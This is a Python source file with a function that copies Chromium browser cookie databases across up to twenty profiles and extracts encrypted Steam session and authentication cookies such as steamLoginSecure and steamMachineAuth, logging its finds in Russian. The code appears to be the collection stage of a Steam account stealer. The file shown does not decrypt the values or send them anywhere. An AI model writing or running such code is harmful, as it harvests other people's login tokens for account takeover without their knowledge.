import os
import sqlite3
import shutil
import base64

def decrypt_chrome_cookies(browser_name: str, base_path: str, log_callback=None):
    results = []
    profiles = ["Default"] + [f"Profile {i}" for i in range(1, 20)]

    for profile in profiles:
        db_path = os.path.join(base_path, profile, "Network", "Cookies")
        if not os.path.exists(db_path):
            continue

        temp_db = f"temp_{browser_name}_{profile}.db"
        try:
            shutil.copy2(db_path, temp_db)
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()

            cursor.execute("""
                SELECT host_key, name, encrypted_value
                FROM cookies
                WHERE name IN ('steamLogin','steamLoginSecure','sessionid','steamMachineAuth','steamRememberLogin')
            """)

            for host, name, enc_value in cursor.fetchall():
                if enc_value:
                    encrypted_b64 = base64.b64encode(enc_value).decode('utf-8')
                    results.append({
                        "browser": browser_name,
                        "profile": profile,
                        "host": host,
                        "cookie": name,
                        "encrypted_value": encrypted_b64
                    })
                    if log_callback:
                        log_callback(f"✓ Найдено: {name} | {browser_name}/{profile}")

            conn.close()
        except Exception as e:
            if log_callback:
                log_callback(f"[!] Ошибка {browser_name}/{profile}: {e}")
        finally:
            if os.path.exists(temp_db):
                try:
                    os.remove(temp_db)
                except:
                    pass

    return results